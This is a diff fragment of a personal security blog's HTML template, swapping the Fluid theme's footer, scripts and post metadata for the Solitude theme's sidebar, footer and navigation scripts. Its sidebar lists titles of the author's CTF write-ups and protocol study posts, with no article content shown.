class="author-info__description">fault的小天地喵</div><div class="author-info__description2">I believe you can find knowledge and tutorials here that will be useful to you.</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about/"><div class="author-info__name">fault_li</div><div class="author-info__desc"></div></a><div class="card-info-social-icons is-center"><a class="social-icon" target="_blank" rel="noopener" href="https://github.com/fault123" title="Github"><i class="solitude  fab fa-github"></i></a><a class="social-icon" target="_blank" rel="noopener" href="https://space.bilibili.com/1329819902" title="Bilibili"><i class="solitude  fab fa-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="solitude fa-solid fa-map"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/07/28/%E5%B7%A5%E5%9D%8Awp-RSA2/" title="工坊wp-RSA2"><img alt="工坊wp-RSA2" src= "/img/loading.avif" data-lazy-src="/"></a><div class="content"><span class="title" href="/2024/07/28/%E5%B7%A5%E5%9D%8Awp-RSA2/" title="工坊wp-RSA2">工坊wp-RSA2</span></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/26/%E5%B7%A5%E5%9D%8Awp-RSA1/" title="nss-工坊wp"><img alt="nss-工坊wp" src= "/img/loading.avif" data-lazy-src="/"></a><div class="content"><span class="title" href="/2024/07/26/%E5%B7%A5%E5%9D%8Awp-RSA1/" title="nss-工坊wp">nss-工坊wp</span></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/07/23/DASCTF%202024%20%E4%B8%83%E6%9C%88%E8%B5%9B%20web%20Sanic's%20revenge&amp;&amp;ciscn%202024%20sanic%E7%9A%84%E5%A4%8D%E7%9B%98/" title="DASCTF 2024 七月赛 web Sanic's revenge&amp;&amp;ciscn 2024 sanic的复盘"><img alt="DASCTF 2024 七月赛 web Sanic's revenge&amp;&amp;ciscn 2024 sanic的复盘" src= "/img/loading.avif" data-lazy-src="/"></a><div class="content"><span class="title" href="/2024/07/23/DASCTF%202024%20%E4%B8%83%E6%9C%88%E8%B5%9B%20web%20Sanic's%20revenge&amp;&amp;ciscn%202024%20sanic%E7%9A%84%E5%A4%8D%E7%9B%98/" title="DASCTF 2024 七月赛 web Sanic's revenge&amp;&amp;ciscn 2024 sanic的复盘">DASCTF 2024 七月赛 web Sanic's revenge&amp;&amp;ciscn 2024 sanic的复盘</span></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/21/NTLM%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/" title="NTLM认证学习"><img alt="NTLM认证学习" src= "/img/loading.avif" data-lazy-src="/"></a><div class="content"><span class="title" href="/2024/03/21/NTLM%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/" title="NTLM认证学习">NTLM认证学习</span></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/03/21/kerberos%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/" title="kerberos协议学习"><img alt="kerberos协议学习" src= "/img/loading.avif" data-lazy-src="/"></a><div class="content"><span class="title" href="/2024/03/21/kerberos%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0/" title="kerberos协议学习">kerberos协议学习</span></div></div></div></div></div></div></main><footer id="footer"><div id="st-footer-bar"><div class="footer-logo"><span>fault# Solitude / fas fa-ghost / /img/pwa/favicon.ico</span></div><div class="footer-bar-description">Articles from Ever Fu.</div><a class="footer-bar-link" href="/about/">Learn more</a></div><div id="footer_deal"></div><div id="st-footer"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div class="copyright">© 2023 - 2024 By&nbsp;<a class="footer-bar-link" href="/">fault_li</a></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/everfu/hexo-theme-solitude" alt="Theme">Theme</a></div></div></div></footer></div><!-- right_menu--><!-- inject body--><div><script src="/js/utils.js?v=2.0.4"></script><script src="/js/main.js?v=2.0.4"></script><script src="/js/third_party/waterfall.min.js?v=2.0.4"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/pjax/0.2.8/pjax.min.js"></script><script src="/js/third_party/universe.min.js?v=2.0.4"></script><script>dark()
+</script><script src="https://cdnjs.cloudflare.com/ajax/libs/vanilla-lazyload/19.1.3/lazyload.iife.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/node-snackbar/0.1.16/snackbar.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/Swiper/11.0.5/swiper-bundle.min.js"></script><script>var meting_api = 'https://meting.qjqq.cn/?server=:server&type=:type&id=:id&auth=:auth&r=:r';</script><script src="https://cdnjs.cloudflare.com/ajax/libs/aplayer/1.10.1/APlayer.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/meting/2.0.1/Meting.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js"></script><div class="js-pjax"></div></div><!-- pjax--><script>const pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: ['title','#body-wrap','#site-config','meta[name="description"]','.js-pjax','meta[property^="og:"]','#config-diff'],
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+})
 
-                
-              </div>
-            
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-  
-    <div class="post-meta">
-      <i class="iconfont icon-tags"></i>
-      
-        <a href="/tags/Web/" class="print-no-link">#Web</a>
-      
-        <a href="/tags/%E6%AF%94%E8%B5%9Bwp/" class="print-no-link">#比赛wp</a>
-      
-    </div>
-  
-</div>
+document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+})
 
+document.addEventListener('pjax:complete', () => {
+    window.refreshFn()
 
-              
-  
-
-  <div class="license-box my-3">
-    <div class="license-title">
-      <div>DASCTF 2024 七月赛 web Sanic&#39;s revenge&amp;&amp;ciscn 2024 sanic的复盘</div>
-      <div>http://example.com/2024/07/23/DASCTF 2024 七月赛 web Sanic&#39;s revenge&amp;&amp;ciscn 2024 sanic的复盘/</div>
-    </div>
-    <div class="license-meta">
-      
-        <div class="license-meta-item">
-          <div>作者</div>
-          <div>fault_li</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>发布于</div>
-          <div>2024年7月23日</div>
-        </div>
-      
-      
-      
-        <div class="license-meta-item">
-          <div>许可协议</div>
-          <div>
-            
-              
-              
-                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
-                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
-                    <i class="iconfont icon-by"></i>
-                  </span>
-                </a>
-              
-            
-          </div>
-        </div>
-      
-    </div>
-    <div class="license-icon iconfont"></div>
-  </div>
-
-
-
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2024/07/26/%E5%B7%A5%E5%9D%8Awp-RSA1/" title="nss-工坊wp">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">nss-工坊wp</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2024/03/21/NTLM%E8%AE%A4%E8%AF%81%E5%AD%A6%E4%B9%A0/" title="NTLM认证学习">
-                        <span class="hidden-mobile">NTLM认证学习</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
-
-            
-          </article>
-        </div>
-      </div>
-    </div>
-
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-  <aside class="sidebar" style="margin-left: -1rem">
-    <div id="toc">
-  <p class="toc-header">
-    <i class="iconfont icon-list"></i>
-    <span>目录</span>
-  </p>
-  <div class="toc-body" id="toc-body"></div>
-</div>
-
-
-
-  </aside>
-
-
-    </div>
-  </div>
-</div>
-
-
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-  
-
-
-
-
-
-
-
-    
-
-    
-      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
-        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
-      </a>
-    
-
-    
-      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
-     aria-hidden="true">
-  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
-    <div class="modal-content">
-      <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
-        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
-          <span aria-hidden="true">&times;</span>
-        </button>
-      </div>
-      <div class="modal-body mx-3">
-        <div class="md-form mb-5">
-          <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
-        </div>
-        <div class="list-group" id="local-search-result"></div>
-      </div>
-    </div>
-  </div>
-</div>
-
-    
-
-    
-  </main>
-
-  <footer>
-    <div class="footer-inner">
-  
-    <div class="footer-content">
-       <a href="https://github.com/fault123" target="_blank" rel="nofollow noopener"><span>fault</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
-    </div>
-  
-  
-  
-  
-</div>
-
-  </footer>
-
-  <!-- Scripts -->
-  
-  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
-  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
-
-  <script>
-    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
-    NProgress.start()
-    window.addEventListener('load', function() {
-      NProgress.done();
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+        const newScript = document.createElement('script')
+        const content = item.text || item.textContent || item.innerHTML || ""
+        Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+        newScript.appendChild(document.createTextNode(content))
+        item.parentNode.replaceChild(newScript, item)
     })
-  </script>
 
+    GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
 
-<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
-<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
-<script  src="/js/events.js" ></script>
-<script  src="/js/plugins.js" ></script>
+})
 
-
-  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
-  <script>
-    (function (window, document) {
-      var typing = Fluid.plugins.typing;
-      var subtitle = document.getElementById('subtitle');
-      if (!subtitle || !typing) {
-        return;
-      }
-      var text = subtitle.getAttribute('data-typed-text');
-      
-        typing(text);
-      
-    })(window, document);
-  </script>
-
-
-
-
-  
-    <script  src="/js/img-lazyload.js" ></script>
-  
-
-
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
-    var toc = jQuery('#toc');
-    if (toc.length === 0 || !window.tocbot) { return; }
-    var boardCtn = jQuery('#board-ctn');
-    var boardTop = boardCtn.offset().top;
-
-    window.tocbot.init(Object.assign({
-      tocSelector     : '#toc-body',
-      contentSelector : '.markdown-body',
-      linkClass       : 'tocbot-link',
-      activeLinkClass : 'tocbot-active-link',
-      listClass       : 'tocbot-list',
-      isCollapsedClass: 'tocbot-is-collapsed',
-      collapsibleClass: 'tocbot-is-collapsible',
-      scrollSmooth    : true,
-      includeTitleTags: true,
-      headingsOffset  : -boardTop,
-    }, CONFIG.toc));
-    if (toc.find('.toc-list-item').length > 0) {
-      toc.css('visibility', 'visible');
+document.addEventListener('pjax:error', (e) => {
+    if (e.request.status === 404) {
+        pjax.loadUrl('/404.html')
     }
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('tocbot' in window) {
-        tocbot.refresh();
-        var toc = jQuery('#toc');
-        if (toc.length === 0 || !tocbot) {
-          return;
-        }
-        if (toc.find('.toc-list-item').length > 0) {
-          toc.css('visibility', 'visible');
-        }
-      }
-    });
-  });
-</script>
-
-
-  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
-
-  <script>Fluid.plugins.codeWidget();</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
-    window.anchors.options = {
-      placement: CONFIG.anchorjs.placement,
-      visible  : CONFIG.anchorjs.visible
-    };
-    if (CONFIG.anchorjs.icon) {
-      window.anchors.options.icon = CONFIG.anchorjs.icon;
+})</script><!-- theme--><script>initTheme = () => {
+    let isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const cachedMode = utils.saveToLocal.get('theme');
+    if (cachedMode === undefined) {
+        const nowMode =
+            isDarkMode ? 'dark' : 'light'
+        document.documentElement.setAttribute('data-theme', nowMode);
+    } else {
+        document.documentElement.setAttribute('data-theme', cachedMode);
     }
-    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-    var res = [];
-    for (var item of el) {
-      res.push('.markdown-body > ' + item.trim());
-    }
-    if (CONFIG.anchorjs.placement === 'left') {
-      window.anchors.options.class = 'anchorjs-link-left';
-    }
-    window.anchors.add(res.join(', '));
-
-    Fluid.events.registerRefreshCallback(function() {
-      if ('anchors' in window) {
-        anchors.removeAll();
-        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
-        var res = [];
-        for (var item of el) {
-          res.push('.markdown-body > ' + item.trim());
-        }
-        if (CONFIG.anchorjs.placement === 'left') {
-          anchors.options.class = 'anchorjs-link-left';
-        }
-        anchors.add(res.join(', '));
-      }
-    });
-  });
-</script>
-
-
-  
-<script>
-  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
-    Fluid.plugins.fancyBox();
-  });
-</script>
-
-
-  <script>Fluid.plugins.imageCaption();</script>
-
-  <script  src="/js/local-search.js" ></script>
-
-
-
-
-  
-<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/runtime.min.js"></script>
-<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/Cherry.min.js"></script>
-<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/star.min.js"></script>
-<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/love.min.js"></script>
-
-
-
-<!-- 主题的启动项，将它保持在最底部 -->
-<!-- the boot of the theme, keep it at the bottom -->
-<script  src="/js/boot.js" ></script>
-
-
-  
-
-  <noscript>
-    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
-  </noscript>
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":300,"height":600},"mobile":{"show":true},"react":{"opacity":1},"log":false});</script></body>
-</html>
+    typeof rm === 'object' && rm.mode(cachedMode === 'dark' && isDarkMode)
+}
+initTheme()</script><!-- google adsense--><!-- search--><!-- Tianli-Talk--><!-- music--><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"left","width":300,"height":600},"mobile":{"show":true},"react":{"opacity":1},"log":false});</script></body></html><script>const posts=["2024/07/28/工坊wp-RSA2/","2024/07/26/工坊wp-RSA1/","2024/07/23/DASCTF 2024 七月赛 web Sanic's revenge&&ciscn 2024 sanic的复盘/","2024/03/21/NTLM认证学习/","2024/03/21/kerberos协议学习/","2024/03/21/2023/","2024/03/21/NSSCTF IOT题目复现/","2024/03/21/commonscollections-1/","2024/03/21/commons-collections 6/","2024/03/21/commons-collections 4/","2024/03/21/commons-collections 2/","2024/03/21/commons-collection 3/","2024/03/21/动态类加载/","2024/03/21/动态代理/","2024/03/21/URLDNS/","2024/03/21/Tomcat源码初识（tomcat流程）/","2024/03/21/hello-world/","2024/02/18/EL表达式注入/"];function toRandomPost(){ pjax.loadUrl(GLOBAL_CONFIG.root+posts[Math.floor(Math.random()*posts.length)]); }</script>
